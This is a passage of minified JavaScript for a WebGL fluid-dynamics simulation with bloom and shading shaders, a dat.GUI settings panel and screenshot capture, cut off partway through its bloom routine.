"use strict";const canvas=document.getElementsByTagName("canvas")[0];resizeCanvas();let config={SIM_RESOLUTION:128,DYE_RESOLUTION:1024,CAPTURE_RESOLUTION:512,DENSITY_DISSIPATION:2,VELOCITY_DISSIPATION:2,PRESSURE:.8,PRESSURE_ITERATIONS:20,CURL:30,SPLAT_RADIUS:.25,SPLAT_FORCE:6e3,SHADING:!0,COLORFUL:!0,COLOR_UPDATE_SPEED:10,PAUSED:!1,BACK_COLOR:{r:0,g:0,b:0},TRANSPARENT:!1,BLOOM:!0,BLOOM_ITERATIONS:8,BLOOM_RESOLUTION:256,BLOOM_INTENSITY:.8,BLOOM_THRESHOLD:.6,BLOOM_SOFT_KNEE:.7};function pointerPrototype(){this.id=-1,this.texcoordX=0,this.texcoordY=0,this.prevTexcoordX=0,this.prevTexcoordY=0,this.deltaX=0,this.deltaY=0,this.down=!1,this.moved=!1,this.color=[30,0,300]}let pointers=[],splatStack=[],bloomFramebuffers=[];pointers.push(new pointerPrototype);const{gl:gl,ext:ext}=getWebGLContext(canvas);function getWebGLContext(e){const r={alpha:!0,depth:!1,stencil:!1,antialias:!1,preserveDrawingBuffer:!1};let t=e.getContext("webgl2",r);const o=!!t;let i,n;o||(t=e.getContext("webgl",r)||e.getContext("experimental-webgl",r)),o?(t.getExtension("EXT_color_buffer_float"),n=t.getExtension("OES_texture_float_linear")):(i=t.getExtension("OES_texture_half_float"),n=t.getExtension("OES_texture_half_float_linear")),t.clearColor(0,0,0,1);const a=o?t.HALF_FLOAT:i.HALF_FLOAT_OES;let l,c,u;return o?(l=getSupportedFormat(t,t.RGBA16F,t.RGBA,a),c=getSupportedFormat(t,t.RG16F,t.RG,a),u=getSupportedFormat(t,t.R16F,t.RED,a)):(l=getSupportedFormat(t,t.RGBA,t.RGBA,a),c=getSupportedFormat(t,t.RGBA,t.RGBA,a),u=getSupportedFormat(t,t.RGBA,t.RGBA,a)),{gl:t,ext:{formatRGBA:l,formatRG:c,formatR:u,halfFloatTexType:a,supportLinearFiltering:n}}}function getSupportedFormat(e,r,t,o){if(!supportRenderTextureFormat(e,r,t,o))switch(r){case e.R16F:return getSupportedFormat(e,e.RG16F,e.RG,o);case e.RG16F:return getSupportedFormat(e,e.RGBA16F,e.RGBA,o);default:return null}return{internalFormat:r,format:t}}function supportRenderTextureFormat(e,r,t,o){let i=e.createTexture();e.bindTexture(e.TEXTURE_2D,i),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,e.NEAREST),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,e.NEAREST),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,e.CLAMP_TO_EDGE),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,e.CLAMP_TO_EDGE),e.texImage2D(e.TEXTURE_2D,0,r,4,4,0,t,o,null);let n=e.createFramebuffer();e.bindFramebuffer(e.FRAMEBUFFER,n),e.framebufferTexture2D(e.FRAMEBUFFER,e.COLOR_ATTACHMENT0,e.TEXTURE_2D,i,0);return e.checkFramebufferStatus(e.FRAMEBUFFER)==e.FRAMEBUFFER_COMPLETE}function startGUI(){var e=new dat.GUI({width:300});e.add(config,"DYE_RESOLUTION",{high:1024,medium:512,low:256,"very low":128}).name("quality").onFinishChange(initFramebuffers),e.add(config,"SIM_RESOLUTION",{32:32,64:64,128:128,256:256}).name("sim resolution").onFinishChange(initFramebuffers),e.add(config,"DENSITY_DISSIPATION",0,4).name("density diffusion"),e.add(config,"VELOCITY_DISSIPATION",0,4).name("velocity diffusion"),e.add(config,"PRESSURE",0,1).name("pressure"),e.add(config,"CURL",0,50).name("vorticity").step(1),e.add(config,"SPLAT_RADIUS",.01,1).name("splat radius"),e.add(config,"SHADING").name("shading"),e.add(config,"COLORFUL").name("colorful"),e.add(config,"PAUSED").name("paused").listen(),e.add({fun:()=>{splatStack.push(parseInt(20*Math.random())+5)}},"fun").name("Random splats");let r=e.addFolder("Bloom");r.add(config,"BLOOM").name("enabled"),r.add(config,"BLOOM_INTENSITY",.1,2).name("intensity"),r.add(config,"BLOOM_THRESHOLD",0,1).name("threshold");let t=e.addFolder("Capture");t.addColor(config,"BACK_COLOR").name("background color"),t.add(config,"TRANSPARENT").name("transparent"),t.add({fun:captureScreenshot},"fun").name("take screenshot");let o=e.add({fun:()=>{window.open("https://github.com/PavelDoGreat/WebGL-Fluid-Simulation"),ga("send","event","link button","github")}},"fun").name("Github");o.__li.className="cr function bigFont",o.__li.style.borderLeft="3px solid #8C8C8C";let i=document.createElement("span");o.domElement.parentElement.appendChild(i),i.className="icon github";let n=e.add({fun:()=>{ga("send","event","link button","twitter"),window.open("https://twitter.com/PavelDoGreat")}},"fun").name("Twitter");n.__li.className="cr function bigFont",n.__li.style.borderLeft="3px solid #8C8C8C";let a=document.createElement("span");n.domElement.parentElement.appendChild(a),a.className="icon twitter";let l=e.add({fun:()=>{ga("send","event","link button","discord"),window.open("https://discordapp.com/invite/CeqZDDE")}},"fun").name("Discord");l.__li.className="cr function bigFont",l.__li.style.borderLeft="3px solid #8C8C8C";let c=document.createElement("span");l.domElement.parentElement.appendChild(c),c.className="icon discord";let u=e.add({fun:()=>{ga("send","event","link button","app"),window.open("http://onelink.to/5b58bn")}},"fun").name("Check out mobile app");u.__li.className="cr function appBigFont",u.__li.style.borderLeft="3px solid #00FF7F";let g=document.createElement("span");u.domElement.parentElement.appendChild(g),g.className="icon app",isMobile()&&e.close()}function isMobile(){return/Mobi|Android/i.test(navigator.userAgent)}function captureScreenshot(){let e=getResolution(config.CAPTURE_RESOLUTION),r=createFBO(e.width,e.height,ext.formatRGBA.internalFormat,ext.formatRGBA.format,ext.halfFloatTexType,gl.NEAREST);render(r);let t=framebufferToTexture(r);t=normalizeTexture(t,r.width,r.height);let o=textureToCanvas(t,r.width,r.height).toDataURL();downloadURI("fluid.png",o),URL.revokeObjectURL(o)}function framebufferToTexture(e){gl.bindFramebuffer(gl.FRAMEBUFFER,e.fbo);let r=e.width*e.height*4,t=new Float32Array(r);return gl.readPixels(0,0,e.width,e.height,gl.RGBA,gl.FLOAT,t),t}function normalizeTexture(e,r,t){let o=new Uint8Array(e.length),i=0;for(let n=t-1;n>=0;n--)for(let t=0;t<r;t++){let a=n*r*4+4*t;o[a+0]=255*clamp01(e[i+0]),o[a+1]=255*clamp01(e[i+1]),o[a+2]=255*clamp01(e[i+2]),o[a+3]=255*clamp01(e[i+3]),i+=4}return o}function clamp01(e){return Math.min(Math.max(e,0),1)}function textureToCanvas(e,r,t){let o=document.createElement("canvas"),i=o.getContext("2d");o.width=r,o.height=t;let n=i.createImageData(r,t);return n.data.set(e),i.putImageData(n,0,0),o}function downloadURI(e,r){let t=document.createElement("a");t.download=e,t.href=r,document.body.appendChild(t),t.click(),document.body.removeChild(t)}isMobile()&&(config.DYE_RESOLUTION=512),ext.supportLinearFiltering||(config.DYE_RESOLUTION=512,config.SHADING=!1,config.BLOOM=!1);class GLProgram{constructor(e,r){if(this.uniforms={},this.program=gl.createProgram(),gl.attachShader(this.program,e),gl.attachShader(this.program,r),gl.linkProgram(this.program),!gl.getProgramParameter(this.program,gl.LINK_STATUS))throw gl.getProgramInfoLog(this.program);const t=gl.getProgramParameter(this.program,gl.ACTIVE_UNIFORMS);for(let e=0;e<t;e++){const r=gl.getActiveUniform(this.program,e).name;this.uniforms[r]=gl.getUniformLocation(this.program,r)}}bind(){gl.useProgram(this.program)}}function compileShader(e,r,t){if(null!=t){let e="";t.forEach((r=>{e+="#define "+r+"\n"})),r=e+r}const o=gl.createShader(e);if(gl.shaderSource(o,r),gl.compileShader(o),!gl.getShaderParameter(o,gl.COMPILE_STATUS))throw gl.getShaderInfoLog(o);return o}const baseVertexShader=compileShader(gl.VERTEX_SHADER,"\n    precision highp float;\n    attribute vec2 aPosition;\n    varying vec2 vUv;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform vec2 texelSize;\n    void main () {\n        vUv = aPosition * 0.5 + 0.5;\n        vL = vUv - vec2(texelSize.x, 0.0);\n        vR = vUv + vec2(texelSize.x, 0.0);\n        vT = vUv + vec2(0.0, texelSize.y);\n        vB = vUv - vec2(0.0, texelSize.y);\n        gl_Position = vec4(aPosition, 0.0, 1.0);\n    }\n"),copyShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    uniform sampler2D uTexture;\n    void main () {\n        gl_FragColor = texture2D(uTexture, vUv);\n    }\n"),clearShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    uniform sampler2D uTexture;\n    uniform float value;\n    void main () {\n        gl_FragColor = value * texture2D(uTexture, vUv);\n    }\n"),colorShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    uniform vec4 color;\n    void main () {\n        gl_FragColor = color;\n    }\n"),checkerboardShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uTexture;\n    uniform float aspectRatio;\n    #define SCALE 25.0\n    void main () {\n        vec2 uv = floor(vUv * SCALE * vec2(aspectRatio, 1.0));\n        float v = mod(uv.x + uv.y, 2.0);\n        v = v * 0.1 + 0.8;\n        gl_FragColor = vec4(vec3(v), 1.0);\n    }\n"),displayShaderSource="\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform sampler2D uTexture;\n    uniform sampler2D uBloom;\n    uniform sampler2D uDithering;\n    uniform vec2 ditherScale;\n    uniform vec2 texelSize;\n    vec3 linearToGamma (vec3 color) {\n        color = max(color, vec3(0));\n        return max(1.055 * pow(color, vec3(0.416666667)) - 0.055, vec3(0));\n    }\n    void main () {\n        vec3 c = texture2D(uTexture, vUv).rgb;\n    #ifdef SHADING\n        vec3 lc = texture2D(uTexture, vL).rgb;\n        vec3 rc = texture2D(uTexture, vR).rgb;\n        vec3 tc = texture2D(uTexture, vT).rgb;\n        vec3 bc = texture2D(uTexture, vB).rgb;\n        float dx = length(rc) - length(lc);\n        float dy = length(tc) - length(bc);\n        vec3 n = normalize(vec3(dx, dy, length(texelSize)));\n        vec3 l = vec3(0.0, 0.0, 1.0);\n        float diffuse = clamp(dot(n, l) + 0.7, 0.7, 1.0);\n        c *= diffuse;\n    #endif\n    #ifdef BLOOM\n        vec3 bloom = texture2D(uBloom, vUv).rgb;\n        float noise = texture2D(uDithering, vUv * ditherScale).r;\n        noise = noise * 2.0 - 1.0;\n        bloom += noise / 255.0;\n        bloom = linearToGamma(bloom);\n        c += bloom;\n    #endif\n        float a = max(c.r, max(c.g, c.b));\n        gl_FragColor = vec4(c, a);\n    }\n",displayShader=compileShader(gl.FRAGMENT_SHADER,displayShaderSource),displayBloomShader=compileShader(gl.FRAGMENT_SHADER,displayShaderSource,["BLOOM"]),displayShadingShader=compileShader(gl.FRAGMENT_SHADER,displayShaderSource,["SHADING"]),displayBloomShadingShader=compileShader(gl.FRAGMENT_SHADER,displayShaderSource,["BLOOM","SHADING"]),bloomPrefilterShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uTexture;\n    uniform vec3 curve;\n    uniform float threshold;\n    void main () {\n        vec3 c = texture2D(uTexture, vUv).rgb;\n        float br = max(c.r, max(c.g, c.b));\n        float rq = clamp(br - curve.x, 0.0, curve.y);\n        rq = curve.z * rq * rq;\n        c *= max(rq, br - threshold) / max(br, 0.0001);\n        gl_FragColor = vec4(c, 0.0);\n    }\n"),bloomBlurShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform sampler2D uTexture;\n    void main () {\n        vec4 sum = vec4(0.0);\n        sum += texture2D(uTexture, vL);\n        sum += texture2D(uTexture, vR);\n        sum += texture2D(uTexture, vT);\n        sum += texture2D(uTexture, vB);\n        sum *= 0.25;\n        gl_FragColor = sum;\n    }\n"),bloomFinalShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform sampler2D uTexture;\n    uniform float intensity;\n    void main () {\n        vec4 sum = vec4(0.0);\n        sum += texture2D(uTexture, vL);\n        sum += texture2D(uTexture, vR);\n        sum += texture2D(uTexture, vT);\n        sum += texture2D(uTexture, vB);\n        sum *= 0.25;\n        gl_FragColor = sum * intensity;\n    }\n"),splatShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uTarget;\n    uniform float aspectRatio;\n    uniform vec3 color;\n    uniform vec2 point;\n    uniform float radius;\n    void main () {\n        vec2 p = vUv - point.xy;\n        p.x *= aspectRatio;\n        vec3 splat = exp(-dot(p, p) / radius) * color;\n        vec3 base = texture2D(uTarget, vUv).xyz;\n        gl_FragColor = vec4(base + splat, 1.0);\n    }\n"),advectionShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    uniform sampler2D uVelocity;\n    uniform sampler2D uSource;\n    uniform vec2 texelSize;\n    uniform vec2 dyeTexelSize;\n    uniform float dt;\n    uniform float dissipation;\n    vec4 bilerp (sampler2D sam, vec2 uv, vec2 tsize) {\n        vec2 st = uv / tsize - 0.5;\n        vec2 iuv = floor(st);\n        vec2 fuv = fract(st);\n        vec4 a = texture2D(sam, (iuv + vec2(0.5, 0.5)) * tsize);\n        vec4 b = texture2D(sam, (iuv + vec2(1.5, 0.5)) * tsize);\n        vec4 c = texture2D(sam, (iuv + vec2(0.5, 1.5)) * tsize);\n        vec4 d = texture2D(sam, (iuv + vec2(1.5, 1.5)) * tsize);\n        return mix(mix(a, b, fuv.x), mix(c, d, fuv.x), fuv.y);\n    }\n    void main () {\n    #ifdef MANUAL_FILTERING\n        vec2 coord = vUv - dt * bilerp(uVelocity, vUv, texelSize).xy * texelSize;\n        vec4 result = bilerp(uSource, coord, dyeTexelSize);\n    #else\n        vec2 coord = vUv - dt * texture2D(uVelocity, vUv).xy * texelSize;\n        vec4 result = texture2D(uSource, coord);\n    #endif\n        float decay = 1.0 + dissipation * dt;\n        gl_FragColor = result / decay;\n    }",ext.supportLinearFiltering?null:["MANUAL_FILTERING"]),divergenceShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uVelocity;\n    void main () {\n        float L = texture2D(uVelocity, vL).x;\n        float R = texture2D(uVelocity, vR).x;\n        float T = texture2D(uVelocity, vT).y;\n        float B = texture2D(uVelocity, vB).y;\n        vec2 C = texture2D(uVelocity, vUv).xy;\n        if (vL.x < 0.0) { L = -C.x; }\n        if (vR.x > 1.0) { R = -C.x; }\n        if (vT.y > 1.0) { T = -C.y; }\n        if (vB.y < 0.0) { B = -C.y; }\n        float div = 0.5 * (R - L + T - B);\n        gl_FragColor = vec4(div, 0.0, 0.0, 1.0);\n    }\n"),curlShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uVelocity;\n    void main () {\n        float L = texture2D(uVelocity, vL).y;\n        float R = texture2D(uVelocity, vR).y;\n        float T = texture2D(uVelocity, vT).x;\n        float B = texture2D(uVelocity, vB).x;\n        float vorticity = R - L - T + B;\n        gl_FragColor = vec4(0.5 * vorticity, 0.0, 0.0, 1.0);\n    }\n"),vorticityShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision highp float;\n    precision highp sampler2D;\n    varying vec2 vUv;\n    varying vec2 vL;\n    varying vec2 vR;\n    varying vec2 vT;\n    varying vec2 vB;\n    uniform sampler2D uVelocity;\n    uniform sampler2D uCurl;\n    uniform float curl;\n    uniform float dt;\n    void main () {\n        float L = texture2D(uCurl, vL).x;\n        float R = texture2D(uCurl, vR).x;\n        float T = texture2D(uCurl, vT).x;\n        float B = texture2D(uCurl, vB).x;\n        float C = texture2D(uCurl, vUv).x;\n        vec2 force = 0.5 * vec2(abs(T) - abs(B), abs(R) - abs(L));\n        force /= length(force) + 0.0001;\n        force *= curl * C;\n        force.y *= -1.0;\n        vec2 vel = texture2D(uVelocity, vUv).xy;\n        gl_FragColor = vec4(vel + force * dt, 0.0, 1.0);\n    }\n"),pressureShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uPressure;\n    uniform sampler2D uDivergence;\n    void main () {\n        float L = texture2D(uPressure, vL).x;\n        float R = texture2D(uPressure, vR).x;\n        float T = texture2D(uPressure, vT).x;\n        float B = texture2D(uPressure, vB).x;\n        float C = texture2D(uPressure, vUv).x;\n        float divergence = texture2D(uDivergence, vUv).x;\n        float pressure = (L + R + B + T - divergence) * 0.25;\n        gl_FragColor = vec4(pressure, 0.0, 0.0, 1.0);\n    }\n"),gradientSubtractShader=compileShader(gl.FRAGMENT_SHADER,"\n    precision mediump float;\n    precision mediump sampler2D;\n    varying highp vec2 vUv;\n    varying highp vec2 vL;\n    varying highp vec2 vR;\n    varying highp vec2 vT;\n    varying highp vec2 vB;\n    uniform sampler2D uPressure;\n    uniform sampler2D uVelocity;\n    void main () {\n        float L = texture2D(uPressure, vL).x;\n        float R = texture2D(uPressure, vR).x;\n        float T = texture2D(uPressure, vT).x;\n        float B = texture2D(uPressure, vB).x;\n        vec2 velocity = texture2D(uVelocity, vUv).xy;\n        velocity.xy -= vec2(R - L, T - B);\n        gl_FragColor = vec4(velocity, 0.0, 1.0);\n    }\n"),blit=(gl.bindBuffer(gl.ARRAY_BUFFER,gl.createBuffer()),gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,-1,1,1,1,1,-1]),gl.STATIC_DRAW),gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER,gl.createBuffer()),gl.bufferData(gl.ELEMENT_ARRAY_BUFFER,new Uint16Array([0,1,2,0,2,3]),gl.STATIC_DRAW),gl.vertexAttribPointer(0,2,gl.FLOAT,!1,0,0),gl.enableVertexAttribArray(0),e=>{gl.bindFramebuffer(gl.FRAMEBUFFER,e),gl.drawElements(gl.TRIANGLES,6,gl.UNSIGNED_SHORT,0)});let dye,velocity,divergence,curl,pressure,bloom,ditheringTexture=createTextureAsync("LDR_LLL1_0.png");const copyProgram=new GLProgram(baseVertexShader,copyShader),clearProgram=new GLProgram(baseVertexShader,clearShader),colorProgram=new GLProgram(baseVertexShader,colorShader),checkerboardProgram=new GLProgram(baseVertexShader,checkerboardShader),displayProgram=new GLProgram(baseVertexShader,displayShader),displayBloomProgram=new GLProgram(baseVertexShader,displayBloomShader),displayShadingProgram=new GLProgram(baseVertexShader,displayShadingShader),displayBloomShadingProgram=new GLProgram(baseVertexShader,displayBloomShadingShader),bloomPrefilterProgram=new GLProgram(baseVertexShader,bloomPrefilterShader),bloomBlurProgram=new GLProgram(baseVertexShader,bloomBlurShader),bloomFinalProgram=new GLProgram(baseVertexShader,bloomFinalShader),splatProgram=new GLProgram(baseVertexShader,splatShader),advectionProgram=new GLProgram(baseVertexShader,advectionShader),divergenceProgram=new GLProgram(baseVertexShader,divergenceShader),curlProgram=new GLProgram(baseVertexShader,curlShader),vorticityProgram=new GLProgram(baseVertexShader,vorticityShader),pressureProgram=new GLProgram(baseVertexShader,pressureShader),gradienSubtractProgram=new GLProgram(baseVertexShader,gradientSubtractShader);function initFramebuffers(){let e=getResolution(config.SIM_RESOLUTION),r=getResolution(config.DYE_RESOLUTION);const t=ext.halfFloatTexType,o=ext.formatRGBA,i=ext.formatRG,n=ext.formatR,a=ext.supportLinearFiltering?gl.LINEAR:gl.NEAREST;dye=null==dye?createDoubleFBO(r.width,r.height,o.internalFormat,o.format,t,a):resizeDoubleFBO(dye,r.width,r.height,o.internalFormat,o.format,t,a),velocity=null==velocity?createDoubleFBO(e.width,e.height,i.internalFormat,i.format,t,a):resizeDoubleFBO(velocity,e.width,e.height,i.internalFormat,i.format,t,a),divergence=createFBO(e.width,e.height,n.internalFormat,n.format,t,gl.NEAREST),curl=createFBO(e.width,e.height,n.internalFormat,n.format,t,gl.NEAREST),pressure=createDoubleFBO(e.width,e.height,n.internalFormat,n.format,t,gl.NEAREST),initBloomFramebuffers()}function initBloomFramebuffers(){let e=getResolution(config.BLOOM_RESOLUTION);const r=ext.halfFloatTexType,t=ext.formatRGBA,o=ext.supportLinearFiltering?gl.LINEAR:gl.NEAREST;bloom=createFBO(e.width,e.height,t.internalFormat,t.format,r,o),bloomFramebuffers.length=0;for(let i=0;i<config.BLOOM_ITERATIONS;i++){let n=e.width>>i+1,a=e.height>>i+1;if(n<2||a<2)break;let l=createFBO(n,a,t.internalFormat,t.format,r,o);bloomFramebuffers.push(l)}}function createFBO(e,r,t,o,i,n){gl.activeTexture(gl.TEXTURE0);let a=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,a),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,n),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,n),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE),gl.texImage2D(gl.TEXTURE_2D,0,t,e,r,0,o,i,null);let l=gl.createFramebuffer();return gl.bindFramebuffer(gl.FRAMEBUFFER,l),gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,a,0),gl.viewport(0,0,e,r),gl.clear(gl.COLOR_BUFFER_BIT),{texture:a,fbo:l,width:e,height:r,attach:e=>(gl.activeTexture(gl.TEXTURE0+e),gl.bindTexture(gl.TEXTURE_2D,a),e)}}function createDoubleFBO(e,r,t,o,i,n){let a=createFBO(e,r,t,o,i,n),l=createFBO(e,r,t,o,i,n);return{width:e,height:r,texelSizeX:1/e,texelSizeY:1/r,get read(){return a},set read(e){a=e},get write(){return l},set write(e){l=e},swap(){let e=a;a=l,l=e}}}function resizeFBO(e,r,t,o,i,n,a){let l=createFBO(r,t,o,i,n,a);return copyProgram.bind(),gl.uniform1i(copyProgram.uniforms.uTexture,e.attach(0)),blit(l.fbo),l}function resizeDoubleFBO(e,r,t,o,i,n,a){return e.width==r&&e.height==t||(e.read=resizeFBO(e.read,r,t,o,i,n,a),e.write=createFBO(r,t,o,i,n,a),e.width=r,e.height=t,e.texelSizeX=1/r,e.texelSizeY=1/t),e}function createTextureAsync(e){let r=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,r),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.LINEAR),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.REPEAT),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.REPEAT),gl.texImage2D(gl.TEXTURE_2D,0,gl.RGB,1,1,0,gl.RGB,gl.UNSIGNED_BYTE,new Uint8Array([255,255,255]));let t={texture:r,width:1,height:1,attach:e=>(gl.activeTexture(gl.TEXTURE0+e),gl.bindTexture(gl.TEXTURE_2D,r),e)},o=new Image;return o.onload=()=>{t.width=o.width,t.height=o.height,gl.bindTexture(gl.TEXTURE_2D,r),gl.texImage2D(gl.TEXTURE_2D,0,gl.RGB,gl.RGB,gl.UNSIGNED_BYTE,o)},o.src=e,t}initFramebuffers(),multipleSplats(parseInt(20*Math.random())+5);let lastUpdateTime=Date.now(),colorUpdateTimer=0;function update(){const e=calcDeltaTime();resizeCanvas()&&initFramebuffers(),updateColors(e),applyInputs(),config.PAUSED||step(e),render(null),requestAnimationFrame(update)}function calcDeltaTime(){let e=Date.now(),r=(e-lastUpdateTime)/1e3;return r=Math.min(r,.016666),lastUpdateTime=e,r}function resizeCanvas(){let e=scaleByPixelRatio(canvas.clientWidth),r=scaleByPixelRatio(canvas.clientHeight);return(canvas.width!=e||canvas.height!=r)&&(canvas.width=e,canvas.height=r,!0)}function updateColors(e){config.COLORFUL&&(colorUpdateTimer+=e*config.COLOR_UPDATE_SPEED,colorUpdateTimer>=1&&(colorUpdateTimer=wrap(colorUpdateTimer,0,1),pointers.forEach((e=>{e.color=generateColor()}))))}function applyInputs(){splatStack.length>0&&multipleSplats(splatStack.pop()),pointers.forEach((e=>{e.moved&&(e.moved=!1,splatPointer(e))}))}function step(e){gl.disable(gl.BLEND),gl.viewport(0,0,velocity.width,velocity.height),curlProgram.bind(),gl.uniform2f(curlProgram.uniforms.texelSize,velocity.texelSizeX,velocity.texelSizeY),gl.uniform1i(curlProgram.uniforms.uVelocity,velocity.read.attach(0)),blit(curl.fbo),vorticityProgram.bind(),gl.uniform2f(vorticityProgram.uniforms.texelSize,velocity.texelSizeX,velocity.texelSizeY),gl.uniform1i(vorticityProgram.uniforms.uVelocity,velocity.read.attach(0)),gl.uniform1i(vorticityProgram.uniforms.uCurl,curl.attach(1)),gl.uniform1f(vorticityProgram.uniforms.curl,config.CURL),gl.uniform1f(vorticityProgram.uniforms.dt,e),blit(velocity.write.fbo),velocity.swap(),divergenceProgram.bind(),gl.uniform2f(divergenceProgram.uniforms.texelSize,velocity.texelSizeX,velocity.texelSizeY),gl.uniform1i(divergenceProgram.uniforms.uVelocity,velocity.read.attach(0)),blit(divergence.fbo),clearProgram.bind(),gl.uniform1i(clearProgram.uniforms.uTexture,pressure.read.attach(0)),gl.uniform1f(clearProgram.uniforms.value,config.PRESSURE),blit(pressure.write.fbo),pressure.swap(),pressureProgram.bind(),gl.uniform2f(pressureProgram.uniforms.texelSize,velocity.texelSizeX,velocity.texelSizeY),gl.uniform1i(pressureProgram.uniforms.uDivergence,divergence.attach(0));for(let e=0;e<config.PRESSURE_ITERATIONS;e++)gl.uniform1i(pressureProgram.uniforms.uPressure,pressure.read.attach(1)),blit(pressure.write.fbo),pressure.swap();gradienSubtractProgram.bind(),gl.uniform2f(gradienSubtractProgram.uniforms.texelSize,velocity.texelSizeX,velocity.texelSizeY),gl.uniform1i(gradienSubtractProgram.uniforms.uPressure,pressure.read.attach(0)),gl.uniform1i(gradienSubtractProgram.uniforms.uVelocity,velocity.read.attach(1)),blit(velocity.write.fbo),velocity.swap(),advectionProgram.bind(),gl.uniform2f(advectionProgram.uniforms.texelSize,velocity.texelSizeX,velocity.texelSizeY),ext.supportLinearFiltering||gl.uniform2f(advectionProgram.uniforms.dyeTexelSize,velocity.texelSizeX,velocity.texelSizeY);let r=velocity.read.attach(0);gl.uniform1i(advectionProgram.uniforms.uVelocity,r),gl.uniform1i(advectionProgram.uniforms.uSource,r),gl.uniform1f(advectionProgram.uniforms.dt,e),gl.uniform1f(advectionProgram.uniforms.dissipation,config.VELOCITY_DISSIPATION),blit(velocity.write.fbo),velocity.swap(),gl.viewport(0,0,dye.width,dye.height),ext.supportLinearFiltering||gl.uniform2f(advectionProgram.uniforms.dyeTexelSize,dye.texelSizeX,dye.texelSizeY),gl.uniform1i(advectionProgram.uniforms.uVelocity,velocity.read.attach(0)),gl.uniform1i(advectionProgram.uniforms.uSource,dye.read.attach(1)),gl.uniform1f(advectionProgram.uniforms.dissipation,config.DENSITY_DISSIPATION),blit(dye.write.fbo),dye.swap()}function render(e){config.BLOOM&&applyBloom(dye.read,bloom),null!=e&&config.TRANSPARENT?gl.disable(gl.BLEND):(gl.blendFunc(gl.ONE,gl.ONE_MINUS_SRC_ALPHA),gl.enable(gl.BLEND));let r=null==e?gl.drawingBufferWidth:e.width,t=null==e?gl.drawingBufferHeight:e.height;gl.viewport(0,0,r,t);let o=null==e?null:e.fbo;config.TRANSPARENT||drawColor(o,normalizeColor(config.BACK_COLOR)),null==e&&config.TRANSPARENT&&drawCheckerboard(o),drawDisplay(o,r,t)}function drawColor(e,r){colorProgram.bind(),gl.uniform4f(colorProgram.uniforms.color,r.r,r.g,r.b,1),blit(e)}function drawCheckerboard(e){checkerboardProgram.bind(),gl.uniform1f(checkerboardProgram.uniforms.aspectRatio,canvas.width/canvas.height),blit(e)}function drawDisplay(e,r,t){let o=pickDisplayProgram();if(o.bind(),config.SHADING&&gl.uniform2f(o.uniforms.texelSize,1/r,1/t),gl.uniform1i(o.uniforms.uTexture,dye.read.attach(0)),config.BLOOM){gl.uniform1i(o.uniforms.uBloom,bloom.attach(1)),gl.uniform1i(o.uniforms.uDithering,ditheringTexture.attach(2));let e=getTextureScale(ditheringTexture,r,t);gl.uniform2f(o.uniforms.ditherScale,e.x,e.y)}blit(e)}function pickDisplayProgram(){return config.SHADING?config.BLOOM?displayBloomShadingProgram:displayShadingProgram:config.BLOOM?displayBloomProgram:displayProgram}function applyBloom(e,r){if(bloomFramebuffers.length<2)return;let t=r;gl.disable(gl.BLEND),bloomPrefilterProgram.bind();let 